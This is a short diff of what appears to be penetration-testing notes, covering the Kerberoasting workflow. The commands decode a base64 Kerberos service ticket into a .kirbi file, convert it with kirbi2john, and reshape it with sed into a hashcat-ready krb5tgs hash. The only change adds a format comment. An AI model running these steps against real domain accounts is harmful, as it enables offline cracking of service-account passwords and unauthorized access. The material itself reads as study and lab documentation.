@@ -80,7 +80,7 @@ ZWZyZWlnaHQubG9jYWw6MTQzMw==
 $ echo "<base64 blob>" |  tr -d \\n >> encoded_file
 $ cat encoded_file | base64 -d > sqldev.kirbi
 $ kirbi2john sqldev.kirbi
-$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs.hashcat
+$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs.hashcat                 # Only if not in correct format
 $ cat sqldev_tgs_hashcat 
 
 $krb5tgs$23$*sqldev.kirbi*$813149fb<SNIP>8e71a057feeab
